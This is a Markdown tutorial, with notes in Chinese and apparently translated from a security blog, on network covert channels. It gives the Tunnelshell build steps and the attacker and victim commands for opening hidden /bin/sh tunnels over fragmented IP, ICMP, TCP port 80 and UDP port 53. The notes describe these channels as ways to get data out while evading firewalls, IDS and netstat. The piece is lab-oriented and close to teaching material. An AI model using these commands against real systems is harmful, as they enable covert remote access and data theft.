## Covert Channel: The Hidden Network

### What is Covert channel  [^1]

- #### Type of covert channel

  - **Storage covert Channel** [^2]

  - **Timing Covert channels** [^3]

### Covert channel attack using tunnelshell [^4]

- #### What is Tunnelshell [^5]

  - **Requirement**

  - Server (Kali Linux)

  - Client (Ubuntu18.04)

  - Tool for Covert Channel (Tunnelshell) which you can download from [**here**](https://packetstormsecurity.com/search/files/?q=Tunnelshell)

  - ```bash
    # 在两个端点上安装tunnelshell
    tar xvfz tunnelshell_2.3.tgz
    make
    # 打开服务器的通信通道（Attacker）,默认情况下，它会发送片段数据包，该数据包在目的地重新组合以逃避防火墙和IDS
    sudo ./tunneld (Ubuntu)
    # 现在要与tunnelshell连接，我们需要在服务器（攻击者的机器）上执行以下命令，该命令将建立用于数据泄露的隐蔽通道
    # 语法：./ tunnel -i <session id（0-65535）> -d <发送数据包的延迟> -s <数据包大小> -t <隧道类型> -o <协议> -p <端口> -m <ICMP query> -a <ppp interface> <受害者的IP>
    ./tunnel -t frag 10.10.10.2
    # frag：使用IPv4分片数据包封装数据。当某些路由器和防火墙（如Cisco路由器和默认Linux安装）收到第四层没有标头的碎片数据包时，即使它们有拒绝它的规则，它们也允许通过它
    ```

    

- #### Covert ICMP Channel

  - Client: `sudo ./tunneld -t icmp -m echo-reply，echo`
  - Sever: `./tunnel -t icmp -m echo-reply,echo 10.10.10.2`

- #### Covert HTTP Channel [^6]

  - Client: `sudo  ./tunneld -t tcp -p 80,2000`
  - Server: `./tunnel -t tcp -p 80,2000 10.10.10.2`

- #### Covert DNS Channel [^7]

  - Client: `sudo ./tunneld -t udp -p 53,2000`
  - Server: `./tunnel -t udp -p 53,2000 10.10.10.2`

### Conclusion [^8]

[原文](https://www.hackingarticles.in/covert-channel-the-hidden-network/)

---

[^1]: 隐蔽一词意味着“隐藏或不可检测”，而频道是“通信模式”，因此隐蔽频道表示不可检测的通信网络。这使得管理员或用户通过秘密信道几乎检测不到传输。了解加密通信和隐蔽通信之间的区别非常重要。在隐蔽通信中，数据流由未授权方进行乱码和持久。然而，加密通信并不掩盖通过加密在两个端点之间传输的数据进行通信的事实

[^2]: 通过修改“存储位置”进行通信，这将允许一个进程直接或间接写入存储位置，并由另一个进程直接或间接读取它

[^3]: 执行影响接收器“观察到的实际响应时间”的操作。*注意：众所周知的Spectre和Meltdown使用系统的页面缓存作为其用于exfiltrating数据的隐蔽通道。**Specter和Meltdown攻击的工作原理是欺骗你的计算机缓存特权内存，错误的推测执行，缺乏检查无序执行的权限，以及页面缓存的强大功能。一旦访问了特权存储器，处理器就会缓存信息，并且处理器能够从缓存中检索它，无论其是否具有特权信息。**从[**这里**](https://medium.com/@danielabloom/covert-channels-demystified-4b1f406a76e3)阅读完整的文章。

[^4]: 几乎可以使用任何协议来建立隐蔽通道。绝大多数隐蔽频道研究都基于第3层（网络）和第4层（传输）协议，如ICMP，IP和TCP。还经常使用诸如HTTP和DNS的第7层（应用）协议。这种机制用于在不提醒网络防火墙和IDS的情况下传送信息，而且netstat无法检测到
[^5]: Tunnelshell是一个用C编写的程序，适用于Linux用户，可以使用客户端 - 服务器范例。服务器打开客户端可以通过虚拟隧道访问的/ bin / sh。它适用于多种协议，包括TCP，UDP，ICMP和RawIP，都可以使用。此外，数据包可能被分段以逃避防火墙和IDS
[^6]: 它在不使用三向握手的情况下建立虚拟TCP连接。它不绑定任何端口，因此您可以使用另一个进程已经在使用的端口
[^7]: 要建立DNS隐蔽通道，我们需要在两台端点机器上运行UDP隧道模式
[^8]: 隐蔽通道在数据泄露时不会发送加密数据包，因此，它很容易嗅探，网络管理员可以轻松进行数据丢失和风险管理